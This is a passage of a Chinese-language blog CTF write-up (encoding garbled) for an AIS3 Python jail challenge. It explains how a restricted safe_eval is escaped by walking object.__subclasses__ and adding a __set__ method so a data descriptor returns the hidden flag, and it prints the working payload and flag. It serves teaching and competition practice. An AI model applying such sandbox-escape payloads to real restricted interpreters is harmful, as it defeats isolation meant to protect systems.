class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your challenge begin here!</span></span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;âœï¸: &quot;</span>)</span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    payload,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;test.__dict__: &#123;test.__dict__&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ğŸš©: <span class="subst">&#123;test.desc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹å®Œ source code å¯ä»¥ç™¼ç¾ä»–åœ¨print <code>welcome_msg</code> çš„æ™‚å€™ç”¨äº†ä¸€å€‹éå¸¸è©­ç•°çš„æ–¹æ³•ï¼Œä¹Ÿç®—æ˜¯é€™é¡Œçš„é¡Œç¤ºã€‚</p>
<h3 id="welcome-msgåˆ°åº•åœ¨å¹¹å˜›"><a href="#welcome-msgåˆ°åº•åœ¨å¹¹å˜›" class="headerlink" title="welcome_msgåˆ°åº•åœ¨å¹¹å˜›"></a>welcome_msgåˆ°åº•åœ¨å¹¹å˜›</h3><p>é¦–å…ˆçœ‹åˆ°ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å…¶å¯¦æœƒç™¼ç¾ä½ å¯ä»¥é€é <code>getattr(type, name)</code> å–å¾—<code>type</code>åº•ä¸‹çš„attribute<br>é€™è£¡æœƒå¡ä¸€å€‹çŸ¥è­˜é»ï¼Œå°±æ˜¯ç•¶ä½ è¦å–å¾—æŸå€‹ class çš„ subclass çš„æ™‚å€™(å‡è¨­æ˜¯ str )ï¼Œæœƒå¯« <code>str.__subclasses__()</code> ï¼Œä½†å…¶å¯¦å¯ä»¥å¯«æˆ <code>type.__subclasses__(str)</code> ï¼Œå‰ææ˜¯ <code>str</code> çš„ <code>class</code> å¿…é ˆæ˜¯ <code>type</code></p>
<p><strong>æ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆé€é <code>getattr(type,&quot;__subclasses__&quot;)</code> å–å¾— <code>type.__subclasses__</code> å†æŠŠ <code>__base__</code> å¡é€²å»å°±å¯ä»¥å¾—åˆ° <code>type.__base__.__subclasses__()</code></strong></p>
<p>å¥½åˆ°é€™é‚Šå¤§å®¶æ‡‰è©²å·²ç¶“ææ‡‚ä¸Šé¢é‚£é™€ <code>welcome_msg</code> çš„ payload åˆ°åº•åœ¨å¹¹å˜›äº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯åˆ° <code>object</code> è£¡é¢æŠŠæ‰€æœ‰ class æŠ“å‡ºä¾†ï¼Œç„¶å¾ŒæŠ“å€’æ•¸ç¬¬2å€‹ <code>class</code> (<code>jail.Desc</code>)æŠŠå®ƒå°å‡ºä¾†</p>
<h3 id="è§£é¡Œ"><a href="#è§£é¡Œ" class="headerlink" title="è§£é¡Œ"></a>è§£é¡Œ</h3><p>ä¸€é–‹å§‹æƒ³æ”¹æŠ“ <code>jail.Test</code> ä¸‹é¢çš„ <code>desc</code> å°±å¯ä»¥æ‹¿åˆ° <code>flag</code> äº†<br>æŠ“æ˜¯æŠ“å¾—åˆ°ï¼Œä½†æ˜¯printä¸å‡ºä¾†å•Š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = Desc();a.desc_helper(<span class="string">&quot;__base__&quot;</span>);obj=a.helper;a = Desc();a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>);obj = a.helper(obj)[-<span class="number">1</span>].desc</span><br></pre></td></tr></table></figure>

<p>é€™é‚Šåˆå¡ä¸€å€‹çŸ¥è­˜é»äº†ï¼Œé‚£å°±æ˜¯ <strong>python çš„ descriptor è§£ææœ‰å„ªå…ˆåº¦çš„å•é¡Œ</strong>(é¡Œç›®æœ‰æç¤ºdescribeï¼Œé›–ç„¶æˆ‘è¦ºå¾—æ²’æœ‰äººçœ‹å¾—æ‡‚)</p>
<p>ä»¥ä¸‹åƒè€ƒ @Vincent550102 çš„ç­†è¨˜ï¼š</p>
<blockquote>
<ul>
<li>å¦‚æœ __get__ èˆ‡ __set__ éƒ½æœ‰ï¼Œå„ªå…ˆä½¿ç”¨æè¿°å™¨ï¼ˆDescriptorï¼‰ï¼š<br>ç•¶ä¸€å€‹æè¿°å™¨åŒæ™‚å¯¦ç¾äº† __get__ å’Œ __set__ æ–¹æ³•æ™‚ï¼ŒPython æœƒèªç‚ºå®ƒæ˜¯ä¸€å€‹è³‡æ–™æè¿°å™¨ï¼ˆData Descriptorï¼‰ã€‚è³‡æ–™æè¿°å™¨çš„ä¸€å€‹ç‰¹é»æ˜¯å®ƒå€‘å°å±¬æ€§çš„è¨ªå•æœ‰æ›´é«˜çš„å„ªå…ˆç´šã€‚<br>å¦‚æœä¸æ˜¯ï¼Œå‰‡åœ¨è‡ªå·±çš„ __dict__ è£¡é¢æ‰¾ï¼š</li>
<li>å¦‚æœæè¿°å™¨æ²’æœ‰ä½œç‚ºè³‡æ–™æè¿°å™¨æˆ–è€…åªå¯¦ç¾äº† __get__ æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼ˆNon-Data Descriptorï¼‰æˆ–è€…æ‰¾ä¸åˆ°æè¿°å™¨ï¼ŒPython æœƒç¹¼çºŒåœ¨ç‰©ä»¶çš„ __dict__ å±¬æ€§å­—å…¸ä¸­å°‹æ‰¾æ˜¯å¦å­˜åœ¨è©²å±¬æ€§ã€‚</li>
<li>è‹¥åœ¨ __dict__ ä¹Ÿæ‰¾ä¸åˆ°ï¼Œå˜—è©¦ç”¨æè¿°å™¨çš„ __get__ï¼š<br>å¦‚æœåœ¨ç‰©ä»¶çš„ <strong>dict</strong> ä¸­æ‰¾ä¸åˆ°è©²å±¬æ€§ï¼ŒPython æœƒæª¢æŸ¥æ˜¯å¦å­˜åœ¨åªå¯¦ç¾äº† <strong>get</strong> æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå‰‡å›å‚³è©²æè¿°å™¨çš„ __get__ æ–¹æ³•ã€‚<br>éƒ½æ²’æœ‰ï¼Œç›´æ¥å›å‚³æè¿°å™¨ï¼š</li>
<li>å¦‚æœä¸Šè¿°æ­¥é©Ÿéƒ½ç„¡æ³•æ‰¾åˆ°è©²å±¬æ€§ï¼Œæœ€å¾Œæœƒè¿”å›æè¿°å™¨ç‰©ä»¶æœ¬èº«ï¼Œå¦‚æœé€£æè¿°å™¨ä¹Ÿä¸å­˜åœ¨ï¼Œå‰‡æœƒæ‹‹å‡º AttributeErrorã€‚</li>
</ul>
</blockquote>
<p>çœ‹åˆ°é€™é‚Šï¼Œå•é¡Œå·²ç¶“è®Šå¾ˆç°¡å–®äº†ï¼Œé‚£å°±æ˜¯<strong>æˆ‘å€‘éœ€è¦å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´š</strong>ï¼Œæ­¤æ™‚å¾Œé¢å°±ç®— fake_flag æŠŠ <code>test.desc</code> è“‹æ‰ä¹Ÿæ²’æœ‰ç”¨ï¼Œä»ç„¶æœƒå›å‚³ <code>Test.__get__()</code> çš„å…§å®¹</p>
<p>å¦‚ä½•å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´šå‘¢ï¼Ÿ<strong>åªè¦æ–°å¢ä¸€å€‹ <code>__set__</code> å°±è¡Œäº†</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func = <span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span></span><br><span class="line">desc.__setattr__(<span class="string">&quot;__set__&quot;</span>,func)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">(a := Desc(),a.desc_helper(<span class="string">&quot;__base__&quot;</span>),obj:=a.helper,a := Desc(),a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>),desc:=a.helper(obj)[-<span class="number">2</span>],a:=Desc(),a.desc_helper(<span class="string">&quot;__setattr__&quot;</span>),func:=<span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>,a.helper(desc,<span class="string">&quot;__set__&quot;</span>,func))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}</p>
</blockquote>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://avatars.githubusercontent.com/u/46417323" alt="TriangleSnake"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">TriangleSnake</p><p class="is-size-6 is-block">National Cheng Kung University</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">13</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†é¡</p><a href="/categories"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ¨™ç±¤</p><a href="/tags"><p class="title">16</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/TriangleSnake" target="_blank" rel="me noopener">è¿½è¹¤</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/TriangleSnake"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†é¡</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Cybersecurity/"><span class="level-start"><span class="level-item">Cybersecurity</span></span><span class="level-end"><span class="level-item tag">11</span></span></a><ul><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/Cheatsheet/"><span class="level-start"><span class="level-item">Cheatsheet</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/Writeup/"><span class="level-start"><span class="level-item">Writeup</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/Cybersecurity/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/Others/"><span class="level-start"><span class="level-item">Others</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-06-22T07:21:56.000Z">2025-06-22</time></p><p class="title"><a href="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/">å«ä½ æ‰“é¶æ©Ÿå¹³å°ä¸æ˜¯å«ä½ æŠŠæ•´å€‹å¹³å°æ‰“ä¸‹ä¾†ï¼Œè¨˜éŒ„é‡å° vulfocus çš„ä¸€æ¬¡æ»²é€</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-01-01T10:54:15.000Z">2025-01-01</time></p><p class="title"><a href="/2025/01/01/Confusion-Attacks-Exploiting-Hidden-Semantic-Ambiguity-In-Apache-HTTP-Server-Orange-Tsai/">Confusion Attacks: Exploiting Hidden Semantic Ambiguity In Apache HTTP Server! - Orange Tsai</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-12-07T11:30:27.000Z">2024-12-07</time></p><p class="title"><a href="/2024/12/07/2024-CGGC-CTF-Final-Writeup/">2024 CGGC CTF Final Writeup</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a> / <a href="/categories/Cybersecurity/CTF/">CTF</a> / <a href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-11-18T11:22:14.000Z">2024-11-18</time></p><p class="title"><a href="/2024/11/18/%E8%B7%A8%E7%A7%91%E7%B3%BB%E6%8E%A8%E7%94%84%E5%9B%9B%E5%A4%A7%E8%B3%87%E5%AE%89%E6%89%80%E6%8E%A8%E7%94%84%E5%BF%83%E5%BE%97/">è·¨ç§‘ç³»æ¨ç”„å››å¤§è³‡å®‰æ‰€æ¨ç”„å¿ƒå¾—</a></p><p class="categories"><a href="/categories/Others/">Others</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-30T18:02:43.000Z">2024-10-31</time></p><p class="title"><a href="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/">One Million ASUS Routers Under Control: Exploiting ASUS DDNS to MITM Admin Credentials</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">å½™æ•´</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/06/"><span class="level-start"><span class="level-item">å…­æœˆ 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/01/"><span class="level-start"><span class="level-item">ä¸€æœˆ 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/12/"><span class="level-start"><span class="level-item">åäºŒæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/11/"><span class="level-start"><span class="level-item">åä¸€æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">åæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">å…«æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">å…­æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/04/"><span class="level-start"><span class="level-item">å››æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">äºŒæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">åäºŒæœˆ 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">æ¨™ç±¤</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLi/"><span class="tag">SQLi</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apache/"><span class="tag">apache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/argument-injection/"><span class="tag">argument injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command-injection/"><span class="tag">command injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/misc/"><span class="tag">misc</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxmox/"><span class="tag">proxmox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8E%A8%E7%94%84/"><span class="tag">æ¨ç”„</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%A0%94%E7%A9%B6%E6%89%80/"><span class="tag">ç ”ç©¶æ‰€</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tag">è³‡å®‰</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="TriangeSnake&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 TriangleSnake</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">Â© 2024</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-tw");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é é¦–" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="è«‹è¼¸å…¥é—œéµå­—..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"è«‹è¼¸å…¥é—œéµå­—...","untitled":"(ç„¡æ¨™é¡Œ)","posts":"æ–‡ç« ","pages":"é é¢","categories":"åˆ†é¡","tags":"æ¨™ç±¤"});
        });</script></body></html>